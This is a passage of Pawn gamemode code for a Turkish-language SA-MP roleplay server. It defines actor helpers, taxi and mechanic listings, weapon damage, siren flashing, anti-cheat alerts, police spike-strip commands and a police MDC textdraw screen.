	SetDynamicActorVirtualWorld(NPC[actorid][nid], nvw);
	return 1;
}

stock SetDynamicActorSkin(actorid, _skinid)
{
	if(!IsValidDynamicActor(actorid)) return false;
	NPC[actorid][nskin] = _skinid;
	return ReSpawnActor(actorid);
}

stock GetDynamicActorSkin(actorid)
{
	if(!IsValidDynamicActor(actorid)) return false;
	return NPC[actorid][nskin];
}

stock SetDynamicActorName(actorid, _name[])
{
    if(!IsValidDynamicActor(actorid)) return false;
    format(NPC[actorid][nad], 32, "%s", _name);
    return UpdateDynamic3DTextLabelText(NPC[actorid][nadtext], NPC[actorid][nrenk], _name);
}

stock SetDynamicActorColor(actorid, _color)
{
    if(!IsValidDynamicActor(actorid)) return false;
    NPC[actorid][nrenk] = _color;
    return UpdateDynamic3DTextLabelText(NPC[actorid][nadtext], _color, NPC[actorid][nad]);
}

stock DynamicActorSay(actorid, text[], color, Float:distance = 15.0)
{
    if(!IsValidDynamicActor(actorid)) return false;
    new Float:pos3D[3];
    GetDynamicActorPos(actorid, pos3D[0], pos3D[1], pos3D[2]);
	if(IsValidDynamic3DTextLabel(NPC[actorid][nyazitext])) UpdateDynamic3DTextLabelText(NPC[actorid][nyazitext], color, text);
    else NPC[actorid][nyazitext] = CreateDynamic3DTextLabel(text, color, pos3D[0], pos3D[1], (pos3D[2] + 1.1), distance, .testlos=1);
    return SetTimerEx("DeleteDynamicActorSay", 4000, false, "i", NPC[actorid][nid]);
}

forward DeleteDynamicActorSay(actorid);
public DeleteDynamicActorSay(actorid)
{
    if(!IsValidDynamicActor(actorid) || !IsValidDynamic3DTextLabel(NPC[actorid][nyazitext])) return false;
    UpdateDynamic3DTextLabelText(NPC[actorid][nyazitext], -1, "");
	return 1;
}

CMD:taktif(playerid, params[])
{
	SendClientMessage(playerid, -1, ""C2"[Aktif Taksici Listesi (ARA 444)]");
	new _say=0;
	foreach(new i : Player)
	{
	    if(tisbasi[i] == 1 && Girdi[i])
	    {
	        _say++;
	        SendClientMessageEx(playerid, -1, "%s(%d) - TelNo: %d",OyuncuAdiniBul(i),i,Karakter[i][telno]);
	    }
	}
	if(_say == 0) Hata(playerid, "Aktif taksici bulunmamaktadýr.");
	return 1;
}

CMD:maktif(playerid, params[])
{
	SendClientMessage(playerid, -1, ""C2"[Aktif Mekanik Listesi]");
	new _say=0;
	foreach(new i : Player)
	{
	    if(Karakter[i][mekisbasi] == 1 && Girdi[i])
	    {
	        _say++;
	        SendClientMessageEx(playerid, -1, "%s(%d) - TelNo: %d",OyuncuAdiniBul(i),i,Karakter[i][telno]);
	    }
	}
	if(_say == 0) Hata(playerid, "Aktif mekanik bulunmamaktadýr.");
	return 1;
}

forward SoygunIconKapa(iconid);
public SoygunIconKapa(iconid)
{
	foreach(new i : Player)
	{
	    if(Birlik[Karakter[i][birlik]][ftip] == LSPD)
			RemovePlayerMapIcon(i, iconid);
	}
}

stock HasarVer(playerid, HasarTip, weaponid, Float:vHp, Float:vArmor)
{
	new Float:Hasar;
	switch(weaponid)
	{
		case 22: Hasar = 15;
		case 23: Hasar = 35;
		case 24: Hasar = 40;
		case 25: Hasar = 30;
		case 26: Hasar = 25;
		case 27: Hasar = 20;
		case 28: Hasar = 13;
		case 29: Hasar = 18;
		case 30: Hasar = 28;
		case 31: Hasar = 28;
		case 32: Hasar = 14;
		case 33: Hasar = 75;
		case 34: Hasar = 115;
	}
	if(vArmor > 0)
	{
		if(HasarTip == 1)
		{
			SetPlayerArmour(playerid, 0);
			SetPlayerHealth(playerid, 0.0);
		}
		else if(HasarTip == 2 || HasarTip == 3)
		{
			vArmor -= Hasar;
			vHp -= Hasar/2;
			if(vArmor > 0) SetPlayerArmour(playerid, vArmor);
			else SetPlayerArmour(playerid, 0);
			SetPlayerHealth(playerid, vHp);
		}
	}
	else
	{
		if(HasarTip == 1)
		{
			SetPlayerHealth(playerid, 0.0);
		}
		else if(HasarTip == 2 || HasarTip == 3)
		{
			SetPlayerHealth(playerid, vHp-Hasar);
		}
	}
	return 1;
}

forward OnLightFlash(vehicleid);
public OnLightFlash(vehicleid)
{
    	new panels, doors, lights, tires;
    	GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
    	switch(Flash[vehicleid])
    	{
        	case 0: UpdateVehicleDamageStatus(vehicleid, panels, doors, 2, tires);
            case 1: UpdateVehicleDamageStatus(vehicleid, panels, doors, 5, tires);
            case 2: UpdateVehicleDamageStatus(vehicleid, panels, doors, 2, tires);
            case 3: UpdateVehicleDamageStatus(vehicleid, panels, doors, 4, tires);
            case 4: UpdateVehicleDamageStatus(vehicleid, panels, doors, 5, tires);
            case 5: UpdateVehicleDamageStatus(vehicleid, panels, doors, 4, tires);
        }
        if(Flash[vehicleid] >=5) Flash[vehicleid] = 0;
        else Flash[vehicleid] ++;
        return 1;
}

public OnVehicleSirenStateChange(playerid, vehicleid, newstate)
{
		if(Debug) printf("OnVehicleSirenStateChange(%d, %d, %d)",playerid, vehicleid, newstate);
        if(newstate)
        {
            FlashTime[vehicleid] = SetTimerEx("OnLightFlash", flashtime, true, "d", vehicleid);
        }
        if(!newstate)
        {
            new panels, doors, lights, tires;
            KillTimer(FlashTime[vehicleid]);
            GetVehicleDamageStatus(vehicleid, panels, doors, lights, tires);
            UpdateVehicleDamageStatus(vehicleid, panels, doors, 0, tires);
        }
        return 1;
}

forward ClearShock(playerid);
public ClearShock(playerid)
{
    SetPlayerDrunkLevel(playerid, 0);
    return 1;
}

stock OnPlayerChangeWeapon(playerid, oldweapon, newweapon)
{
	#pragma unused oldweapon
    if(IsPlayerAttachedObjectSlotUsed(playerid, GetPVarInt(playerid, "SilahSkinIndex"))){
        RemovePlayerAttachedObject(playerid, GetPVarInt(playerid, "SilahSkinIndex"));
 	}
	if(Karakter[playerid][SilahSkin][newweapon] < 0) {
		new _id;
		for(new i=0;i<sizeof(GunSkinsOffset);i++) {
			if(Karakter[playerid][SilahSkin][newweapon] == GunSkinsOffset[i][ModelID]) {
				_id = i;
				break;
			}
		}
		SetPVarInt(playerid, "SilahSkinIndex", GetFreeAttachedObjectIndexEx(playerid));
   		SetPlayerAttachedObject(playerid, GetPVarInt(playerid, "SilahSkinIndex"), GunSkinsOffset[_id][ModelID], 6, GunSkinsOffset[_id][goX], GunSkinsOffset[_id][goY], GunSkinsOffset[_id][goZ], GunSkinsOffset[_id][grX], GunSkinsOffset[_id][grY], GunSkinsOffset[_id][grZ], GunSkinsOffset[_id][gsX], GunSkinsOffset[_id][gsY], GunSkinsOffset[_id][gsZ]);
	}
	if(newweapon==WEAPON_DEAGLE || newweapon==WEAPON_M4 || newweapon==WEAPON_SHOTGUN)
	{
      	if(flashlight[playerid]==1)
        {
           	SetPlayerAttachedObject(playerid, 9,18656, 6, 0.25, -0.0155, 0.16, 86.5, -185, 86.5, 0.03, 0.03, 0.03);
            SetPlayerAttachedObject(playerid, 8,18641, 6, 0.2, 0.01, 0.16, 90, -95, 90, 1, 1, 1);
            flashlight[playerid]=1;
            return 1;
        }
        else if(flashlight[playerid]==2)
        {
			SetPlayerAttachedObject(playerid, 9,18656, 6, 0.16, -0.0155, 0.16, 86.5, -185, 86.5, 0.03, 0.1, 0.03);
            SetPlayerAttachedObject(playerid, 8,18641, 6, 0.2, 0.01, 0.16, 90, -95, 90, 1, 1, 1);
            flashlight[playerid]=2;
            return 1;
 		}
	}
	else
	{
		if(flashlight[playerid]==1)
        {
          	SetPlayerAttachedObject(playerid, 9,18656, 5, 0.1, 0.038, -0.1, -90, 180, 0, 0.03, 0.03, 0.03);
            SetPlayerAttachedObject(playerid, 8,18641, 5, 0.1, 0.02, -0.05, 0, 0, 0, 1, 1, 1);
            flashlight[playerid]=1;
            return 1;
 		}
        else if(flashlight[playerid]==2)
        {
          	SetPlayerAttachedObject(playerid, 9,18656, 5, 0.1, 0.038, -0.01, -90, 180, 0, 0.03, 0.1, 0.03);
            SetPlayerAttachedObject(playerid, 8,18641, 5, 0.1, 0.02, -0.05, 0, 0, 0, 1, 1, 1);
            flashlight[playerid]=2;
            return 1;
        }
	}
    return 1;
}

public OnPlayerCBug(playerid, weaponid, interval)
{
	DONDUR(playerid);
	COZ(playerid);
	new mstring[128];
	format(mstring, sizeof(mstring), "%s - CBUG",OyuncuAdiniBul(playerid));
	AdminGonder(mstring);
	return 1;
}

public OnPlayerUseAimbot(playerid,hitid,weaponid,type,percentage)
{
	new mstring[128];
	switch(type)
	{
	    case BUSTAIM_AIMBOT_PROAIM:
	    {
	        format(mstring, sizeof(mstring), "%s - AimHack (Kicklendi - %100 AimHack).",OyuncuAdiniBul(playerid));
			AdminGonder(mstring);
			if(percentage == 100)
			{
		    	Kick(playerid);
			}
	    }
	    case BUSTAIM_LONG_RANGE_HITS:
	    {
	        format(mstring, sizeof(mstring), "%s - AimHack(Kontrol Edin).",OyuncuAdiniBul(playerid));
			AdminGonder(mstring);
	    }
	    case BUSTAIM_RANDOM_AIM:
	    {
	        format(mstring, sizeof(mstring), "%s - AimHack(Kontrol Edin).",OyuncuAdiniBul(playerid));
			AdminGonder(mstring);
	    }
	    case BUSTAIM_NO_MISS:
	    {
	        format(mstring, sizeof(mstring), "%s - AimHack(Kontrol Edin).",OyuncuAdiniBul(playerid));
			AdminGonder(mstring);
	    }
	}
	return 1;
}

CMD:tuzak(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != LSPD) return 1;
	new nstring[16],_tip=0;
	if(isnull(params)) return Kullanim(playerid, "/tuzak [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir");
    sscanf(params,"s[16]d",nstring,_tip);
	if(Buysa(nstring,"kur"))
	{
	    if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý olmamýþsýnýz.");
	    if(SpikeStrip_IsValid(Tuzak[playerid])) return Hata(playerid, "Þuanda kurulu bir tuzaðýnýz mevcut.");
	    if(_tip != 1 && _tip != 2) return Kullanim(playerid, "/tuzak kur [tip]"),SendClientMessage(playerid, -1, "Geçerli tipler: 1(Uzun) - 2(Kýsa)");
	    new Float:pPos[4];
	    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
	    GetPlayerFacingAngle(playerid, pPos[3]);
	    if(_tip == 1) Tuzak[playerid] = SpikeStrip_Create(SPIKE_STRIP_LONG, pPos[0], pPos[1], pPos[2]-1.0, pPos[3]+90);
	    else if(_tip == 2) Tuzak[playerid] = SpikeStrip_Create(SPIKE_STRIP_SHORT, pPos[0], pPos[1], pPos[2]-1.0, pPos[3]+90);
	    ObjeKurdu(playerid);
	    Bilgi(playerid, "Baþarýyla tuzak kurdunuz.");
	}
	else if(Buysa(nstring,"kaldir"))
	{
	    if(!SpikeStrip_IsValid(Tuzak[playerid])) return Hata(playerid, "Bir tuzak kurmamýþsýnýz.");
	    SpikeStrip_Delete(Tuzak[playerid]);
	    Bilgi(playerid, "Tuzaðýnýzý baþarýyla kaldýrdýnýz.");
	}
	else return Kullanim(playerid, "/tuzak [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir");
	return 1;
}

CMD:fbituzak(playerid, params[])
{
	if(!Girdi[playerid] || Birlik[Karakter[playerid][birlik]][ftip] != FBI) return 1;
	new nstring[16],_tip=0;
	if(isnull(params)) return Kullanim(playerid, "/fbituzak [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir");
    sscanf(params,"s[16]d",nstring,_tip);
	if(Buysa(nstring,"kur"))
	{
	    if(SpikeStrip_IsValid(Tuzak[playerid])) return Hata(playerid, "Þuanda kurulu bir tuzaðýnýz mevcut.");
	    if(_tip != 1 && _tip != 2) return Kullanim(playerid, "/fbituzak kur [tip]"),SendClientMessage(playerid, -1, "Geçerli tipler: 1(Uzun) - 2(Kýsa)");
	    new Float:pPos[4];
	    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
	    GetPlayerFacingAngle(playerid, pPos[3]);
	    if(_tip == 1) Tuzak[playerid] = SpikeStrip_Create(SPIKE_STRIP_LONG, pPos[0], pPos[1], pPos[2]-1.0, pPos[3]+90);
	    else if(_tip == 2) Tuzak[playerid] = SpikeStrip_Create(SPIKE_STRIP_SHORT, pPos[0], pPos[1], pPos[2]-1.0, pPos[3]+90);
	    ObjeKurdu(playerid);
	    Bilgi(playerid, "Baþarýyla tuzak kurdunuz.");
	}
	else if(Buysa(nstring,"kaldir"))
	{
	    if(!SpikeStrip_IsValid(Tuzak[playerid])) return Hata(playerid, "Bir tuzak kurmamýþsýnýz.");
	    SpikeStrip_Delete(Tuzak[playerid]);
	    Bilgi(playerid, "Tuzaðýnýzý baþarýyla kaldýrdýnýz.");
	}
	else return Kullanim(playerid, "/fbituzak [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, kaldir");
	return 1;
}


CMD:atuzaksil(playerid)
{
	if(!Girdi[playerid] || !AKontrol(playerid) || Karakter[playerid][adminlevel] < 3) return 1;
    SpikeStrip_DeleteAll();
    Bilgi(playerid, "Tüm tuzaklarý sildiniz.");
	return 1;
}

CMD:desteksifirla(playerid)
{
	if(!Girdi[playerid]) return 1;
	if((Karakter[playerid][rutbe] <= 16 && Birlik[Karakter[playerid][birlik]][ftip] == LSPD) || Karakter[playerid][adminlevel] > 0)
	{
	    for(new i;i<MAX_PLAYERS;i++)
		{
		    KillTimer(DestekTimer[i]);
		    KillTimer(DestekTimer2[i]);
		    KillTimer(DestekTimer3[i]);
		    KillTimer(DestekTimer4[i]);
			if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
		    {
				for(new ic=0;ic<=MAX_PLAYERS;ic++)
				{
		    		RemovePlayerMapIcon(i, ic);
				}
			}
		}
	}
	Bilgi(playerid, "Tüm destekleri kaldýrdýnýz.");
	return 1;
}

CMD:dedektif(playerid)
{
	if(!Girdi[playerid]) return 1;
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPD && (Karakter[playerid][rutbe] == 15 || Karakter[playerid][rutbe] == 14 || Karakter[playerid][rutbe] == 13 || Karakter[playerid][rutbe] == 12) || Karakter[playerid][adminlevel] > 0)
	{
	    switch(gDedektif[playerid])
	    {
	        case 0: gDedektif[playerid] = 1,Bilgi(playerid, "TAB'da gözükmüyorsunuz.");
	        case 1: gDedektif[playerid] = 0,Bilgi(playerid, "TAB'da gözüküyorsunuz.");
	    }
	}
	return 1;
}

CMD:hapiscik(playerid)
{
	if(!Girdi[playerid]) return 1;
    if(Karakter[playerid][kodes] == 1)
	{
		SetPlayerPos(playerid, 1799.3591,-1578.5244,14.0806);
		SetPlayerInteriorEx(playerid, 0);
		SetPlayerVirtualWorld(playerid, 0);
	   	Karakter[playerid][kodes] = 0;
	}
	else Hata(playerid, "Hapiste deðilsiniz.");
	return 1;
}

PDTextDrawYukle(playerid) {
	PDMDC[playerid][0] = CreatePlayerTextDraw(playerid, 124.612030, 78.000007, "_~n~");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][0], 0.880702, 29.710844);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][0], 528.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][0], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][0], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][0], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][0], -151587670);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][0], -320017238);
	PlayerTextDrawFont(playerid, PDMDC[playerid][0], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][0], 0);

	PDMDC[playerid][1] = CreatePlayerTextDraw(playerid, 242.313476, 129.916717, "POLICE_DEPARTMENT");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][1], 0.400000, 1.600000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][1], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][1], -151587585);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][1], -1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][1], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][1], 0);

	PDMDC[playerid][2] = CreatePlayerTextDraw(playerid, 223.938400, 183.583206, "Kullanici_Adi_:");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][2], 0.370000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][2], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][2], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][2], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][2], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][2], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][2], 0);

	PDMDC[playerid][3] = CreatePlayerTextDraw(playerid, 269.384948, 211.000061, "Sifre_:");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][3], 0.370000, 2.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][3], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][3], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][3], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][3], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][3], 0);

	PDMDC[playerid][4] = CreatePlayerTextDraw(playerid, 124.143493, 77.416687, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][4], 0.000000, 29.865295);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][4], 122.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][4], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][4], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][4], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][4], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][4], 0);

	PDMDC[playerid][5] = CreatePlayerTextDraw(playerid, 531.757263, 78.000053, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][5], 0.000000, 29.490478);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][5], 526.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][5], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][5], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][5], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][5], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][5], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][5], 0);

	PDMDC[playerid][6] = CreatePlayerTextDraw(playerid, 124.612014, 346.333343, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][6], 0.000000, 0.032902);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][6], 528.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][6], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][6], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][6], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][6], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][6], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][6], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][6], 0);

	PDMDC[playerid][7] = CreatePlayerTextDraw(playerid, 124.143493, 77.416595, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][7], 0.000000, -0.120056);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][7], 527.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][7], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][7], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][7], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][7], 255);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][7], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][7], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][7], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][7], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][7], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][7], 0);

	PDMDC[playerid][8] = CreatePlayerTextDraw(playerid, 208.777435, 188.250000, "LD_BEAT:right");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][8], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][8], 12.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][8], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][8], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][8], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][8], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][8], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][8], 4);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][8], 0);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][8], 0);

	PDMDC[playerid][9] = CreatePlayerTextDraw(playerid, 254.692520, 215.083374, "LD_BEAT:right");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][9], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][9], 12.000000, 13.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][9], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][9], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][9], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][9], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][9], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][9], 4);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][9], 0);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][9], 0);

	PDMDC[playerid][10] = CreatePlayerTextDraw(playerid, 290.000030, 82.666687, "LSPD");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][10], 0.696573, 4.802499);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][10], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][10], -1920073729);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][10], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][10], 1);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][10], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][10], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][10], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][10], 0);

	PDMDC[playerid][11] = CreatePlayerTextDraw(playerid, 319.516906, 188.833312, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][11], 0.000000, 1.426063);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][11], 419.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][11], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][11], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][11], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][11], -1061109505);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][11], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][11], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][11], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][11], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][11], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][11], 0);

	PDMDC[playerid][12] = CreatePlayerTextDraw(playerid, 319.516906, 188.833312, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][12], 0.000000, 1.426063);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][12], 419.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][12], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][12], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][12], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][12], -151587670);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][12], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][12], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][12], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][12], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][12], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][12], 0);

	PDMDC[playerid][13] = CreatePlayerTextDraw(playerid, 319.048370, 215.666656, "box");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][13], 0.000000, 1.426063);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][13], 419.000000, 0.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][13], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][13], -1);
	PlayerTextDrawUseBox(playerid, PDMDC[playerid][13], 1);
	PlayerTextDrawBoxColor(playerid, PDMDC[playerid][13], -151587670);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][13], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][13], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][13], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][13], 1);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][13], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][13], 0);

	PDMDC[playerid][14] = CreatePlayerTextDraw(playerid, 321.859588, 186.499984, "Joseph_Alvares");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][14], 0.138729, 1.979170);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][14], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][14], 421075455);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][14], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][14], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][14], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][14], 2);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][14], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][14], 0);

	PDMDC[playerid][15] = CreatePlayerTextDraw(playerid, 322.796600, 209.833267, "-------");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][15], 0.218846, 2.340838);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][15], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][15], 421075455);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][15], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][15], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][15], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][15], 2);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][15], 1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][15], 0);

	PDMDC[playerid][16] = CreatePlayerTextDraw(playerid, 512.847717, 77.416679, "LD_BEAT:cross");
	PlayerTextDrawLetterSize(playerid, PDMDC[playerid][16], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, PDMDC[playerid][16], 16.000000, 16.000000);
	PlayerTextDrawAlignment(playerid, PDMDC[playerid][16], 1);
	PlayerTextDrawColor(playerid, PDMDC[playerid][16], -1);
	PlayerTextDrawSetShadow(playerid, PDMDC[playerid][16], 0);
	PlayerTextDrawSetOutline(playerid, PDMDC[playerid][16], 0);
	PlayerTextDrawBackgroundColor(playerid, PDMDC[playerid][16], 255);
	PlayerTextDrawFont(playerid, PDMDC[playerid][16], 4);
	PlayerTextDrawSetProportional(playerid, PDMDC[playerid][16], 0);
